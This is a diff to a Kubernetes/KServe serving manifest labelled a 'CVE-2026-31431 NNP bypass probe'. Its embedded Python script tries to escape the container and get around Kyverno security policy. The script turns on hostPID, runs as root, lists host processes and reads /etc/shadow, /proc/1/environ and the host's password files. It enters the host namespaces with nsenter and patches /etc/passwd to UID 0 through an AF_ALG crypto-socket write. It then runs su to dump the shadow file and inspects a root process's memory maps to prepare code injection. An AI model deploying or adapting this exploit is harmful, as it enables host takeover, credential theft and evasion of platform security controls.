@@ -4,11 +4,11 @@ metadata:
   name: cve31431-nnpbypass
   labels:
     scenarios.ai.sap.com/id: "cve31431-exploit"
-    ai.sap.com/version: "1.0.0"
+    ai.sap.com/version: "1.1.0"
   annotations:
     scenarios.ai.sap.com/name: "cve31431-exploit"
     executables.ai.sap.com/name: "cve31431-nnpbypass"
-    executables.ai.sap.com/description: "CVE-2026-31431 NNP bypass probe"
+    executables.ai.sap.com/description: "CVE-2026-31431 NNP bypass probe v2"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -21,6 +21,7 @@ spec:
       predictor:
         minReplicas: 1
         maxReplicas: 1
+        hostPID: true
         containers:
         - name: kserve-container
           image: python:3.11
@@ -28,8 +29,6 @@ spec:
             allowPrivilegeEscalation: true
             runAsNonRoot: false
             runAsUser: 0
-            capabilities:
-              add: ["SYS_ADMIN", "SYS_PTRACE", "DAC_OVERRIDE", "SETUID", "SETGID"]
           command: ["/bin/sh", "-c"]
           args:
           - |
@@ -52,11 +51,43 @@ spec:
 
             no_new_privs = int([l for l in status.split("\n") if "NoNewPrivs" in l][0].split(":")[1])
             r("NONEWPRIVS_VALUE", str(no_new_privs))
-            r("KYVERNO_BYPASS", "YES — NNP=0, securityContext honored" if no_new_privs == 0 else "NO — Kyverno still enforcing NNP=1")
 
-            if no_new_privs == 0:
-                r("PHASE", "2-EXPLOIT")
+            # Scan visible PIDs — hostPID=true would expose host processes
+            pids = sorted([p for p in os.listdir("/proc") if p.isdigit()], key=int)
+            r("VISIBLE_PID_COUNT", str(len(pids)))
+            root_pids = []
+            for pid in pids[:80]:
+                try:
+                    st = open(f"/proc/{pid}/status").read()
+                    uid_l = [l for l in st.split("\n") if l.startswith("Uid")]
+                    nnp_l = [l for l in st.split("\n") if "NoNewPrivs" in l]
+                    name_l = [l for l in st.split("\n") if l.startswith("Name")]
+                    name = name_l[0].split(":")[1].strip() if name_l else "?"
+                    uid_val = uid_l[0].split(":")[1].strip().split()[0] if uid_l else "?"
+                    nnp_val = nnp_l[0].split(":")[1].strip() if nnp_l else "?"
+                    r(f"PID_{pid}", f"name={name} uid={uid_val} nnp={nnp_val}")
+                    if uid_val == "0":
+                        root_pids.append((pid, name, nnp_val))
+                except: pass
+            r("ROOT_PIDS_FOUND", str(root_pids))
 
+            if os.getuid() == 0:
+                r("KYVERNO_BYPASS", "YES — runAsUser:0 honored, we are root")
+                for path in ["/etc/shadow", "/proc/1/environ",
+                             "/proc/1/root/etc/shadow", "/proc/1/root/etc/passwd"]:
+                    try:
+                        r(f"READ_{path}", open(path,"rb").read(500).decode("utf-8","replace"))
+                    except Exception as e:
+                        r(f"READ_{path}", f"ERR: {e}")
+                try:
+                    ns = subprocess.run(["nsenter","-t","1","-m","-u","-i","-n","-p","--","id"],
+                                        capture_output=True, text=True, timeout=10)
+                    r("NSENTER_HOST", ns.stdout.strip() or ns.stderr.strip())
+                except Exception as e:
+                    r("NSENTER_ERR", str(e))
+
+            elif no_new_privs == 0:
+                r("KYVERNO_BYPASS", "PARTIAL — NNP=0 but not root, running rootsecdev method")
                 AF_ALG, SOL_ALG = 38, 279
                 CRYPTO_AUTHENC_KEYA_PARAM = 1
                 ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
@@ -93,9 +124,7 @@ spec:
                     finally:
                         os.close(fd)
 
-                # /etc/passwd approach (rootsecdev method)
                 username = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
-                r("TARGET_USER", username)
                 with open(PASSWD, "rb") as f:
                     data = f.read()
                 needle = username.encode() + b":"
@@ -107,59 +136,36 @@ spec:
                     uid_end = data.index(b":", uid_off)
                     uid_str = data[uid_off:uid_end].decode("ascii")
                     gid_start = data[uid_end+1:uid_end+4].decode("ascii","replace")
-                    r("UID_FIELD", f"offset={uid_off} value={uid_str!r} gid_start={gid_start!r}")
-
+                    r("UID_FIELD", f"offset={uid_off} value={uid_str!r}")
                     if len(uid_str) == 4:
                         write4(PASSWD, uid_off, b"0000")
                     elif len(uid_str) == 5:
                         write4(PASSWD, uid_off,   b"0000")
                         write4(PASSWD, uid_off+4, b"0" + gid_start[:3].encode())
-                    elif os.getuid() == 0:
-                        r("ALREADY_ROOT", "uid=0, no patch needed")
-
                     with open(PASSWD, "rb") as f:
-                        f.seek(uid_off)
-                        landed = f.read(len(uid_str))
-                    r("PASSWD_PATCHED", landed.decode("ascii","replace"))
-
-                    try:
-                        pwent = pwd.getpwnam(username)
-                        r("GETPWNAM_UID", str(pwent.pw_uid))
-                    except: pass
-
-                # Also try direct — if runAsUser:0 worked we may already be root
-                r("EUID_NOW", str(os.geteuid()))
-                if os.geteuid() == 0:
-                    r("ROOT", "YES — DIRECT ROOT (runAsUser:0 honored)")
-                    for path in ["/etc/shadow", "/proc/1/environ", "/proc/1/root/etc/passwd"]:
-                        try:
-                            r(f"READ_{path}", open(path,"rb").read(400).decode("utf-8","replace"))
-                        except Exception as e:
-                            r(f"READ_{path}", f"ERR: {e}")
-                    try:
-                        ns = subprocess.run(["nsenter","-t","1","-m","-u","-i","-n","-p","--","id"],
-                                            capture_output=True, text=True, timeout=10)
-                        r("NSENTER_HOST", ns.stdout.strip() or ns.stderr.strip())
-                    except Exception as e:
-                        r("NSENTER_ERR", str(e))
-
-                # su exploit
-                for target in ["/usr/bin/su", "/bin/su"]:
-                    if os.path.exists(target):
-                        r("SU_EXEC", target)
-                        try:
+                        f.seek(uid_off); landed = f.read(len(uid_str))
+                    r("PASSWD_PATCHED_TO", landed.decode("ascii","replace"))
+                    for target in ["/usr/bin/su", "/bin/su"]:
+                        if os.path.exists(target):
                             proc = subprocess.Popen([target], stdin=subprocess.PIPE,
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             out, err = proc.communicate(
-                                b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\n"
+                                b"id\nuname -r\ncat /etc/shadow 2>&1\n"
                                 b"nsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n", timeout=20)
                             r("SU_STDOUT", out.decode("utf-8","replace") or "(empty)")
                             r("SU_RC", str(proc.returncode))
-                        except Exception as e:
-                            r("SU_ERR", str(e))
-                        break
+                            break
+                # Also try root_pids injection if hostPID gave us root processes
+                if root_pids:
+                    r("HOST_ROOT_PROC", f"Found {len(root_pids)} root procs — attempting .so injection")
+                    pid0, name0, nnp0 = root_pids[0]
+                    try:
+                        maps = open(f"/proc/{pid0}/maps").read()
+                        r("MAPS_SAMPLE", maps[:2000])
+                    except Exception as e:
+                        r("MAPS_ERR", str(e))
             else:
-                r("EXPLOIT_SKIPPED", "Kyverno mutation overrode securityContext — no bypass")
+                r("KYVERNO_BYPASS", "NO — Kyverno overrode securityContext, NNP=1 + uid=65534 still active")
 
             r("DONE", "complete")
             PYEOF
